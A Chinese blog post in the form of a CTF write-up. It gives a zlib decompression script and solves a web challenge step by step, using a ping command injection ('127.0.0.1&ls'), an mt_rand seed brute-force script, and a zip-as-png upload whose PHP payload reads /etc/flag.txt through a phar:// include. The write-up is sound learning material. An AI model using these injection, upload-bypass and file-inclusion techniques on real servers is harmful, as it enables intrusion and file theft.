---
layout: post
title: 近期笔记
subtitle: 
author: Coink
date: 2017-11-19
categories:
tag:
- Tech
---

最近隐写里zlib上镜率比较高，解压缩脚本记录下

```python
#! /usr/bin/env python
import zlib
import binascii
IDAT = "xxxxxxxxxxxxxxxxxxx".decode('hex')
result = binascii.hexlify(zlib.decompress(IDAT))
print result
print result.decode('hex')
```

一道命令执行跟文件包含结合的题：

输入会被当作ping命令执行，竖线被过滤，命令长度限制在3个字符以内，尝试127.0.0.1&ls，列出文件

![](https://i.loli.net/2017/11/19/5a1192adca3ad.png)

转到you_find_upload.php，发现一个随机数

![](https://i.loli.net/2017/11/19/5a1192addcc3d.png)

发现是可以查看源码的

![](https://i.loli.net/2017/11/19/5a1192ae0dfc8.png)

base64解码查看源码，尝试跨目录，发现../被过滤。

```php
<?php
        $type = array('gif','jpg','png');
        mt_srand((time() % rand(1,100000)%rand(1000,9000)));
        echo mt_rand();
        if (isset($_POST['submit'])) {
            $check = getimagesize($_FILES['file']['tmp_name']);
            @$extension = end(explode('.',$_FILES['file']['name']));
            if(in_array($extension,$type)){
                echo 'File is an image - ' . $check['mime'];
                $filename = '/var/www/html/web1/upload/'.mt_rand().'_'.$_FILES['file']['name']; 
                move_uploaded_file($_FILES['file']['tmp_name'], $filename);
                echo "<br>\n";
            } else {
                echo "File is not an image";
            }
        }
        if(isset($_GET['p'])){
            if(@preg_match("/\.\.\//",$_GET['p'])){
                echo "too young too simple";
            }
            else{
               @include $_GET['p'].".php";
            }
        }
        ?>
```

上传的文件只检查后缀，白名单三种图片格式，尝试解析漏洞绕过，无果。

解决随机数问题，发现本质就是随机数种子1000-9000，脚本（by YXM）：

```php
<?php
$t = 333347096;
for ($i = 1;$i<=9000;$i++){
    mt_srand($i);
    $r = mt_rand();
    if($r==333347096){
        echo "seed".$i."\n";
        break;
    }
}
mt_srand($i);
echo "check:".mt_rand()."\n";
echo "answer:".mt_rand();
?>
```

随机数问题解决了，尝试使用压缩上传，协议解压，php文件打包成zip，payload：

```php
<?php 
 $file = fopen('../../../../../../../../etc/flag.txt','r');

    if($file){
        while(!feof($file)){
            $line = fgetc($file);
            echo $line;
        }
    }
    fclose($file);
?>

```

抓包，修改zip文件后缀成png，记录随机数，丢到之前的脚本里跑出上传的目录

![](https://i.loli.net/2017/11/19/5a1192ae115bf.png)

seed404 check:718797317 answer:1230306824

接着用phar://协议解压，访问/web1/you_find_upload.php?p=phar://upload/1230306824_1.png/1

得到flag：

![](https://i.loli.net/2017/11/19/5a1192adbd276.png)

